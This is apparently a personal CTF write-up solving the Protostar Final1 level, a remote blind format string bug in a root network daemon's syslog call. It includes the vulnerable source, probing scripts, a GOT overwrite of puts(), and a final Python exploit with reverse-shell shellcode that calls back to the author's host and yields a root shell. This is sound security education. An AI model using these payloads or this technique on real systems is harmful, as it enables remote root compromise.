#### Protostar Final1

##### About
This level is a remote blind format string level. The ‘already written’ bytes can be variable, and is based upon the length of the IP address and port number.  
  
When you are exploiting this and you don’t necessarily know your IP address and port number (proxy, NAT / DNAT, etc), you can determine that the string is properly aligned by seeing if it crashes or not when writing to an address you know is good.  
  
Core files will be in /tmp.  
  
This level is at /opt/protostar/bin/final1  

##### Source code
```c
#include "../common/common.c"

#include <syslog.h>

#define NAME "final1"
#define UID 0
#define GID 0
#define PORT 2994

char username[128];
char hostname[64];

void logit(char *pw)
{
  char buf[512];

  snprintf(buf, sizeof(buf), "Login from %s as [%s] with password [%s]\n", hostname, username, pw);

  syslog(LOG_USER|LOG_DEBUG, buf);
}

void trim(char *str)
{
  char *q;

  q = strchr(str, '\r');
  if(q) *q = 0;
  q = strchr(str, '\n');
  if(q) *q = 0;
}

void parser()
{
  char line[128];

  printf("[final1] $ ");

  while(fgets(line, sizeof(line)-1, stdin)) {
      trim(line);
      if(strncmp(line, "username ", 9) == 0) {
          strcpy(username, line+9);
      } else if(strncmp(line, "login ", 6) == 0) {
          if(username[0] == 0) {
              printf("invalid protocol\n");
          } else {
              logit(line + 6);
              printf("login failed\n");
          }
      }
      printf("[final1] $ ");
  }
}

void getipport()
{
  int l;
  struct sockaddr_in sin;

  l = sizeof(struct sockaddr_in);
  if(getpeername(0, &sin, &l) == -1) {
      err(1, "you don't exist");
  }

  sprintf(hostname, "%s:%d", inet_ntoa(sin.sin_addr), ntohs(sin.sin_port));
}

int main(int argc, char **argv, char **envp)
{
  int fd;
  char *username;

  /* Run the process as a daemon */
  background_process(NAME, UID, GID); 
  
  /* Wait for socket activity and return */
  fd = serve_forever(PORT);

  /* Set the client socket to STDIN, STDOUT, and STDERR */
  set_io(fd);

  getipport();
  parser();

}
```

It says that it's a remote blind format string level. After looking over this program, all the printf-type functions seem to be used correctly, but what about syslog()?  

##### Solution
```
root@protostar:/# nc 127.0.0.1 2994
[final1] $ username hello
[final1] $ login whatever
login failed

root@protostar:/# tail -f /var/log/syslog | grep final1
......
Dec  10 06:30:36 protostar final1: Login from 127.0.0.1:51057 as [hello] with password [whatever]

root@protostar:/# nc 127.0.0.1 2994
[final1] $ username %x%x%x%x
[final1] $ login %x%x%x%x
login failed

root@protostar:/# tail -f /var/log/syslog | grep final1
Dec  10 06:31:18 protostar final1: Login from 127.0.0.1:51057 as [8049ee4804a2a0804a220bffffbd6] 
with password [b7fd7ff4bffffa2869676f4c7266206e]
```

Bingo! Then I use python script to find the location to write to.

```python
import socket

s = socket.socket()
s.connect(("192.168.56.101",2994))

data = s.recv(1024)

s.sendall("username " + "A" * (127-10) + "\x0a")

data = s.recv(1024)

login = "BBBB %46$x %47$x %48$x %49$x %50$x"
s.sendall("login " + login + "\x0a")

data = s.recv(1024)
print "%s" % data

s.close()
```

And let's see what happen in syslog.

```
root@protostar:/# tail -f /var/log/syslog | grep final1
Dec  10 06:31:18 protostar final1: Login from 127.0.0.1:51057 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] with password 
[BBBB 70206874 77737361 2064726f 4242425b 34252042]
```

We find that "BBBB" is between '%49$x' and '%50$x',  because it's not aligned, let's try again with reducing an 'A' in username.

```
root@protostar:/# tail -f /var/log/syslog | grep final1
Dec  10 06:38:36 protostar final1: Login from 127.0.0.1:51057 as [AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA] with password 
[BBBB 61702068 6f777373 5b206472 42424242 36342520]
```

Now we know '%49$x' hits our data. The problems next are where to put our shellcode and where to write the address of our shellcode so that it can be executed.  
  
Notice that 'username[128]' is a global variable, its address is constant, and 128-12 bytes are far enough for the shellcode I use in final0.  
  
After syslog(), puts() is called, so let's change its entry address in GOT to our shellcode's address.

```
root@protostar:/opt/protostar/bin# objdump -t final1 | grep username
0804a220 g     0 .bss   00000080              username
root@protostar:/opt/protostar/bin# objdump -R final1 | grep puts
0804a194 R_386_JUMP_SLOT   puts
```

To find how many bytes to write exactly, try to use this script to make a segfault.

```python
import socket

s = socket.socket()
s.connect(("192.168.56.101",2994))

payload = "A"*(127-11)

data = s.recv(1024)

s.sendall("username " + payload + "\x0a")

data = s.recv(1024)

login = "\x94\xa1\x04\x08%49$hn"
s.sendall("login " + login + "\x0a")

data = s.recv(1024)
print "%s" % data

s.close()
```

And I find this in /var/log/syslog

```
root@protostar:/# tail -f /var/log/syslog | grep final1
Dec  10 07:01:49 protostar kernel: [   774.176247] final1[1428]: segfault at 80400ac ip 80400ac sp 
bffffbbc error 4 in final1[8048000+2000]
```

It seems that I write 0xac = 172 bytes, then I know how to complete my payload.

```python
import socket

#http://www.shell-storm.org/shellcode/files/shellcode-883.php
shellcode = "\x6a\x66\x58\x6a\x01\x5b\x31\xd2\x52\x53\x6a\x02\x89" \
"\xe1\xcd\x80\x92\xb0\x66\x68\xc0\xa8\x38\x66\x66\x68\x05\x39\x43" \
"\x66\x53\x89\xe1\x6a\x10\x51\x52\x89\xe1\x43\xcd\x80\x6a\x02\x59" \
"\x87\xda\xb0\x3f\xcd\x80\x49\x79\xf9\xb0\x0b\x41\x89\xca\x52\x68" \
"\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"

s = socket.socket()
s.connect(("192.168.56.101",2994))

payload = "\x90"*20 + shellcode
payload = payload + "\x90"*(127-len(payload)-11)

data = s.recv(1024)

s.sendall("username " + payload + "\x0a")

data = s.recv(1024)

login = "\x94\xa1\x04\x08%41348x%49$hn"
s.sendall("login " + login + "\x0a")

data = s.recv(1024)
print "%s" % data

s.close()
```

And I listen to port 1337 in my Kali.

```
root@Kali: ~# nc -l -p 1337
whoami
root
id
uid=0(root) gid=0(root) groups=0(root)
```

##### Reference
<https://thesprawl.org/research/exploit-exercises-protostar-final/#final1>  
<https://www.mattandreko.com/2012/02/05/exploit-exercises-protostar-final-1/>
